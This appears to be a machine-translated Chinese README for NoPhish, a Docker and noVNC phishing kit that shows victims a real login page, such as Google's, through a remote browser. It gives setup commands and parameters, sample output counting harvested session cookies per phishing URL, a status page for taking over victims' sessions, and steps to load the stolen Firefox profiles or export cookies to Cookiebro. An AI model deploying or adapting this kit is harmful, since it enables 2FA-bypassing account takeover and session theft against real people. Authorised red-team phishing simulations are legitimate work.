# NoPhish

另一个基于 Docker 和 noVNC 的钓鱼工具包。整个设置基于 [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/) 和 [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html) 的初始文章。

详细的设置说明可以在这里找到 - [另一个钓鱼工具](https://powerseb.github.io/posts/Another-phishing-tool/)

## 安装

确保已安装并运行 Docker。

安装所需的 Python 模块：

```console
pip install lz4
```
安装设置（这将创建所需的 Docker 镜像）：


```console
setup.sh install
```

## 执行

该设置提供以下参数：

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```
基本运行示例如下：


```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```
在运行过程中，以下概览提供了每个 URL 收集了多少 Cookie 或会话信息的状态。


```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```
请注意，即使未成功登录，该工具也会导出所有的 Cookie / 会话信息。

此外，您还可以直接在状态页面 `http(s)://%DOMAIN%:65534/status.php` 上与工具交互。您可以在此断开用户连接并直接接管会话。

在当前版本的工具中，每个用户会启动两个容器——一个用于桌面设备，一个用于移动设备。根据用户代理，目标会被重定向到合适的容器。移动容器的输出名称以 "m" 开头（例如 mphis1-ffprofile）。

## 使用配置文件导出
如果您使用完整的 FireFox 配置文件导出，可以直接用 -profile 参数调用 firefox，如下所示：

在 Windows 上：
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

在 Linux 上：
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

所有内容都会被恢复，包括最新访问的网站。

请注意，默认情况下您需要解压 zip 压缩包，或将参数 `-z` 设为 `false`。如果选择导出格式 `-e simple`，将生成两个 json 文件，可用于 Cookiebro，该插件在 [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) 和 [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn) 上均可使用。

## 清理

运行过程中，脚本可通过 `ctrl` + `c` 终止——所有运行中的 docker 容器将被删除。要完全移除设置，请运行 `setup.sh cleanup`。




---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-29

---